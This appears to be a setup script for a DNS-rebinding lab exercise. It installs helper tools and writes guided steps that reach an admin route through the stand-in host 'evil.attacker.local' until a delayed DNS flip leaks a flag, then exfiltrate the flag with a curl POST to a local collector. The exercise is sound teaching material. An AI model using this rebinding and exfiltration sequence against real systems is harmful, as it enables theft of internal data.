#!/bin/bash
# Activity 2 initialization
#!/bin/bash
set -euo pipefail

LAB_DIR="/home/labDirectory"
EVAL_DIR="/home/.evaluationScripts"

chmod 666 "$EVAL_DIR/evaluate.json" 2>/dev/null || true
touch "$LAB_DIR/SUBMIT_FLAG.txt"
echo "(Paste only the Activity 2 flag)" > "$LAB_DIR/SUBMIT_FLAG.txt"
chmod 666 "$LAB_DIR/SUBMIT_FLAG.txt"

cp "$EVAL_DIR/activityInitiator/runtime_stack.py" /usr/local/bin/runtime_stack.py
cp "$EVAL_DIR/activityInitiator/labfctl.sh" /usr/local/bin/labfctl
cp "$EVAL_DIR/activityInitiator/rebindctl.sh" /usr/local/bin/rebindctl
cp "$EVAL_DIR/activityInitiator/fetch_sim.sh" /usr/local/bin/fetch-sim
chmod +x /usr/local/bin/runtime_stack.py /usr/local/bin/labfctl /usr/local/bin/rebindctl /usr/local/bin/fetch-sim

LABF_ACTIVITY=2 /usr/local/bin/runtime_stack.py stop || true
LABF_ACTIVITY=2 /usr/local/bin/runtime_stack.py reset
LABF_ACTIVITY=2 /usr/local/bin/runtime_stack.py start

cat > "$LAB_DIR/SCENARIO.txt" << 'EOF'
Activity 2 (Guided): Delayed DNS Flip + Exfiltration

1) Open browser UI: http://127.0.0.1:8080
2) Arm delayed flip (threshold=3):
    labfctl arm 3
3) Hit admin route repeatedly through same hostname:
    fetch-sim evil.attacker.local /admin
    fetch-sim evil.attacker.local /admin
    fetch-sim evil.attacker.local /admin
4) Third request should route to admin-a and return IITB{...}
5) Exfiltrate token (choose one):
    - Browser button "Exfiltrate detected token"
    - curl -s -X POST http://127.0.0.1:8084/collect -d 'token=IITB{...}&source=manual'
6) Confirm evidence:
    labfctl logs exfil
7) Put the IITB{...} token into SUBMIT_FLAG.txt

Troubleshoot with:
- labfctl status
- labfctl logs proxy
EOF

echo "[+] Activity 2 initialized. Browser console: http://127.0.0.1:8080"
